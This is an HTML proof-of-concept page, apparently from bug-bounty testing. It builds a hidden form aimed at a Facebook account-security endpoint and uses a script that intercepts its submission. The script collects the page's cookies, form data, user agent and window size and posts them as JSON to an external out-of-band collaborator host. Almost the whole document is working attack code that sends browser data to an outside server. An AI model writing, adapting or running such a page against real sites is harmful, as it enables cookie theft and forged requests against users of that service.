<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Capture and Send to Burp Collaborator</title>
</head>
<body>
    <form id="myForm" method="GET" action="https://www.facebook.com:443/recent_emails/security/?hide_back_button=1&from_accounts_center=1">
        <input type="hidden" name="hide_back_button" value="1">
        <input type="hidden" name="from_accounts_center" value="1">
        <input type="submit" value="Send" style="display: none;"> <!-- Hide the submit button -->
    </form>
    <script>
        // Function to capture and send data to Burp Collaborator
        function captureAndSendToBurpCollaborator() {
            // Capture form data
            var formData = new FormData(document.getElementById('myForm'));

            // Construct request object
            var request = {
                url: document.getElementById('myForm').action,
                method: document.getElementById('myForm').method,
                headers: {},
                cookies: document.cookie,
                formData: {},
                userAgent: navigator.userAgent,
                windowSize: {
                    width: window.innerWidth,
                    height: window.innerHeight
                }
            };

            // Get request headers
            for (var [key, value] of formData.entries()) {
                request.formData[key] = value;
            }

            // Convert request object to JSON
            var jsonData = JSON.stringify(request);

            // Send captured data to your server
            fetch('https://co4oiq53nckmdhpt89g0rjnkujqxocigt.oast.pro', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: jsonData
            }).then(function(response) {
                console.log('Captured data sent to server successfully');
            }).catch(function(error) {
                console.error('Error sending captured data to server:', error);
            });
        }

        // Intercept form submission and capture data
        document.getElementById('myForm').addEventListener('submit', function(event) {
            event.preventDefault(); // Prevent form submission
            captureAndSendToBurpCollaborator(); // Capture and send data
        });
    </script>
</body>
</html>
